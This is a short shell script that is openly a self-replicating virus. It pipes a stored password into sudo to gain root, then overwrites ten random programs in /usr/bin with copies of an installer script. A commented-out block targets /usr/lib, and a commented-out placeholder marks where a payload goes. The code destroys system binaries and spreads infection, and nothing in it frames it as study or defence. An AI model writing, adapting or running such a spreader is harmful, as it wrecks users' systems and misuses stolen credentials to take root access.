#start payload you want to run when infected files executed
#echo You got pwnd lol
#end payload, start spreader
cat /usr/bin/virus/supass.txt | sudo -S su
cd /usr/bin
shuf -n 10 -e * | xargs -i cp /usr/bin/virus/installer2.sh {} -v #infect 10 random files in the app folder (remove `-v` when not debugging)
#cd /usr/lib
#shuf -n 10 -e * | xargs -i cp /usr/bin/virus/installer2.sh {} -v #infect 10 random files in the library folder (remove `-v` when not debugging)
exit
